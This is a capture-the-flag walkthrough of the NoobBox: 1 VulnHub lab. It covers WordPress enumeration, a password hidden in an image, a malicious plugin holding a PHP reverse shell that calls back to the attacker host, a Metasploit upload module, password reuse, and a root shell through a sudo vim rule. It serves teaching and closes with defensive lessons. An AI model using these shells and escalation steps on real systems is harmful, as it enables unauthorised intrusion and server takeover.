# NoobBox: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an **isolated lab network**. Only attack
> machines you own or have explicit permission to test. Screenshots are
> placeholders — capture your own.

| Field | Value |
| --- | --- |
| **Machine** | NoobBox: 1 |
| **Difficulty** | Beginner |
| **Author** | Shadow Phreak |
| **Released** | 10 March 2021 |
| **VulnHub Entry** | https://vulnhub.com/entry/noobbox-1,664/ |
| **Download** | https://vulnhub.com/entry/noobbox-1,664/#download (mirror: https://download.vulnhub.com/noobbox/NoobBox.zip) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian/Ubuntu, Apache + PHP + WordPress) |

> **Note:** passwords, the WordPress path, and flag values **vary by build**. The
> values shown are from commonly shared builds of the downloadable VM.

---

## 0. What you will learn

- How to find a target and scan it with `nmap`.
- How to enumerate a WordPress site: users, plugins/themes, and hidden files.
- Why brute-forcing **directories with file extensions** matters (finding an image
  that holds a password).
- How a leaked/weak password lets you into `wp-admin`.
- How WordPress admin access becomes **file-upload RCE** (a malicious plugin).
- How password reuse lets you pivot from `www-data` to a real user.
- How a `sudo vim` rule escapes an `rbash` and gives you root.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated host-only network.

```bash
# Identify your own IP and subnet. "eth0" is the lab NIC (name may differ).
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** Kali holds a `192.168.56.x` address (VirtualBox host-only)
> or `192.168.19x.x` (VMware). The target lives on the **same** subnet.

```bash
# ARP-scan the subnet to list live hosts.
sudo arp-scan --interface=eth0 --localnet
# or: sudo nmap -sn 192.168.56.0/24
```

```text
192.168.56.101   08:00:27:dd:ee:ff    PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101`

![Finding the target host](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
# Full TCP sweep, then deep service detection on the open ports.
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 80,22 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.x ((Debian))
|_http-title: NoobBox
```

> **How to read it:**
> - Port **80** is the web server — our main target.
> - Port **22** is SSH — useful later once we have a shell/user.
> - Always scan **all** ports; on some builds a service hides on a high port.

```bash
# Confirm the site and look for a WordPress install.
curl -s http://192.168.56.101/ | head
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.101/wordpress/
```

```text
HTTP/1.1 200 OK
<title>NoobBox</title>
200
```

![Port and service scan](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Enumerate WordPress users and plugins

The landing page is a blog; the real app lives under `/wordpress/`.

```bash
wpscan --url http://192.168.56.101/wordpress/ -e u,ap,at
```

```text
[+] WordPress version identified
[+] Users Identified: noobbox  (login: noobbox)
```

> **Why it works:** WordPress leaks usernames through author pages
> (`/wordpress/?author=1`) and the REST API. `wpscan` collects these for us — we
> now know a valid login name: **`noobbox`**.

### 3.2 Find hidden files — including images

Directory brute-forcing normally looks for pages and scripts. On this box the
*password* is hidden inside an **image**, so we must fuzz **file extensions** too.

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://192.168.56.101/FUZZ -e .jpg,.png,.jpeg,.gif \
     -of html -o scans/ffuf-images.html
```

```text
img.jpg                 [Status: 200, Size: 12345, Words: 1, Lines: 1]
```

```bash
# Download the image and inspect it.
curl -s http://192.168.56.101/img.jpg -o img.jpg
# View it (browser or an image viewer), or carve text out of it:
exiftool img.jpg
strings img.jpg | grep -i -E 'pass|5p4c3|admin'
```

```text
Password: 5p4c3
```

> **Why it works:** developers sometimes "hide" a password by writing it onto an
> image or embedding it in metadata. Brute-forcing only for extensions like
> `.php`/`.html` would miss an `.jpg`. Always fuzz with an extension list.

![Directory enumeration + leaked password in img.jpg](images/03-enum.png)

### 3.3 Log in to WordPress

Browse to `http://192.168.56.101/wordpress/wp-admin/` (or `wp-login.php`) and log
in with the discovered account.

```text
Username: noobbox
Password: 5p4c3
```

> **Why it works:** the leaked "password" from the image is in fact the WordPress
> account password. We are now **administrators** of the site.

### 3.4 Turn admin access into a shell — malicious plugin upload

An admin can install plugins, and a plugin is just a `.zip` full of PHP. Upload a
"plugin" whose PHP calls back to us — this is the classic file-upload RCE.

```bash
# 1. Build a tiny malicious plugin on Kali.
mkdir -p evil && cd evil
cp /usr/share/webshells/php/php-reverse-shell.php evil.php
# Edit $ip -> 192.168.56.10 and $port -> 4444 inside evil.php.
cat > evil.php <<'EOF'
<?php
// Minimal reverse shell — replace IP/PORT with your own.
$sock = fsockopen("192.168.56.10", 4444);
$proc = proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock), $pipes);
?>
EOF
cd .. && zip -r evil.zip evil/
```

```text
  adding: evil/ (stored 0%)
  adding: evil/evil.php (deflated 40%)
```

```bash
# 2. On Kali: start the listener.
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

3. In WordPress: **Plugins → Add New → Upload Plugin**, choose `evil.zip`, click
   **Install Now**, then **Activate**.
4. Activate triggers the PHP, or simply visit the plugin file directly:

```bash
curl "http://192.168.56.101/wordpress/wp-content/plugins/evil/evil.php"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 40210
Linux N00bBox ... GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** having admin rights means we can upload and run arbitrary PHP
> on the server. The uploaded plugin is executed by Apache as **`www-data`**, so
> we receive a shell as that user. This is the "simple file upload RCE" noted on
> the box.

> **Shortcut with Metasploit:** the module
> `exploit/unix/webapp/wp_admin_shell_upload` does exactly this:
>
> ```bash
> msfconsole -q
> use exploit/unix/webapp/wp_admin_shell_upload
> set RHOSTS 192.168.56.101
> set TARGETURI /wordpress
> set USERNAME noobbox
> set PASSWORD 5p4c3
> run
> ```
>
> ```text
> [+] Authenticated with WordPress
> [+] Uploading payload...
> [*] Meterpreter session 1 opened ...
> ```

### 3.5 Upgrade the shell to a full TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. Privilege escalation — becoming root

### 4.1 Pivot from `www-data` to a real user (password reuse)

```bash
# Who are the login users?
cat /etc/passwd | grep -i bash
```

```text
root:x:0:0:root:/root:/bin/bash
noobbox:x:1000:1000:NoobBox,,,:/home/noobbox:/bin/rbash
```

```bash
# Try the WordPress password again — people reuse passwords.
su noobbox
# password: 5p4c3
```

```text
noobbox@N00bBox:/var/www/html$ id
uid=1000(noobbox) gid=1000(noobbox) groups=1000(noobbox)
```

> **Why it works:** the OS account `noobbox` uses the **same password** as the
> WordPress admin account. Password reuse across services is one of the most
> common real-world issues — always test credentials you already hold against
> other logins.

> **Note:** `noobbox`'s shell is `rbash` (a *restricted* bash). It blocks things
> like `cd`, paths, and redirection. We don't need to break out of it to escalate,
> though — `sudo` is still available.

### 4.2 Enumerate sudo rights

```bash
sudo -l
```

```text
User noobbox may run the following commands on N00bBox:
    (ALL : ALL) /usr/bin/vim
```

> **How to read it:** `noobbox` may run **`/usr/bin/vim` as ANY user** (including
> root), with `ALL` meaning no restriction. `vim` can execute shell commands from
> inside the editor — so this is effectively unrestricted root.

### 4.3 Escape `rbash` and become root via `vim`

`vim` can run a shell with `:!` from its command mode. Passing it with `-c` runs
the command immediately on startup:

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

```text
root@N00bBox:/# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `vim` runs as root (via sudo) and can spawn child processes
> through `:!command`. Because the editor process is root, the shell it launches
> is also root. `-c` executes the command right away, so you drop straight into a
> root shell. ("GTFOBins" documents this for `vim`.)

> **Why it also fixes `rbash`:** this is a brand-new root bash started by `vim`,
> not the restricted shell, so the `rbash` limits no longer apply.

![Privilege escalation via sudo vim](images/07-privesc.png)

### 4.4 The root flag

```bash
cd /root
ls -la
cat /root/root.txt
```

```text
<root flag — varies by build (some builds base64-encode it)>
```

> **Tip:** if the flag looks like `c29tZXRoaW5n`, decode it with
> `echo '<value>' | base64 -d`.

![Root flag captured](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | WordPress user enumeration | `/wordpress/` REST API / author pages | Valid login `noobbox` discovered |
| 2 | Password hidden in a web-exposed image | `/img.jpg` | Weak credential recovered (`5p4c3`) |
| 3 | Weak credential → admin panel | `wp-admin` | Full WordPress administrator access |
| 4 | Unrestricted plugin upload (RCE) | Plugins → Add New | Arbitrary PHP execution as `www-data` |
| 5 | Password reuse across services | OS user `noobbox` | Pivot from `www-data` to a login user |
| 6 | Dangerous `sudo` rule | `(ALL:ALL) /usr/bin/vim` | `vim :!bash` → unrestricted root |

---

## 6. Defensive lessons (blue team)

- **Prevent username enumeration** in WordPress (disable author archives / REST
  user endpoints, use a plugin such as an auth-hardening suite).
- **Never hide secrets in client-reachable files.** Passwords written into images
  or metadata are still exposed. Use a password manager and strong, unique values.
- **Enforce strong, unique passwords** and MFA on all admin panels; block
  `wp-admin`/`wp-login.php` from untrusted networks where possible.
- **Restrict plugin/theme installation.** Only allow vetted plugins, disable the
  file editor with `define('DISALLOW_FILE_EDIT', true);`, and run a WordPress
  security/audit plugin.
- **Do not reuse passwords** between web apps and OS accounts; rotate credentials
  and monitor for use of the same secret in multiple places.
- **Sudo least privilege:** never grant `sudo` to full-featured editors or tools
  that can spawn shells (`vim`, `find`, `less`, `awk`, …). Check GTFOBins before
  granting any `sudo` rule, and avoid `NOPASSWD` for anything powerful.
- **Keep software patched** and remove unused plugins, themes, and users.
- **Detection opportunities:** alert on new plugin installs, on `www-data`
  spawning interactive shells or making outbound connections, and on `sudo vim`
  invocations. Forward Apache/PHP logs and auditd to a SIEM.

---

## 7. References

- VulnHub entry (download + author notes): https://vulnhub.com/entry/noobbox-1,664/
- NepCodeX — NoobBox walkthrough: https://nepcodex.com/2021/07/noobbox-walkthrough-vulnhub-writeup/
- Kong Hex — NoobBox walkthrough: https://khdxs7.github.io/ (search "NoobBox")
- Metasploit — `wp_admin_shell_upload`: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/
- GTFOBins — `vim`: https://gtfobins.github.io/gtfobins/vim/
- WPScan documentation: https://github.com/wpscanteam/wpscan

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — target host discovered on the subnet
- [ ] `images/02-nmap.png` — port/service scan (80, 22)
- [ ] `images/03-enum.png` — user enumeration + `img.jpg` password
- [ ] `images/03b-image.png` — the leaked password visible in the image
- [ ] `images/04-foothold.png` — malicious plugin upload / Metasploit session
- [ ] `images/05-shell.png` — `www-data` shell, pivot to `noobbox`
- [ ] `images/06-user-flag.png` — user flag
- [ ] `images/07-privesc.png` — `sudo -l` and `sudo vim -c ':!/bin/bash'`
- [ ] `images/08-root-flag.png` — root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
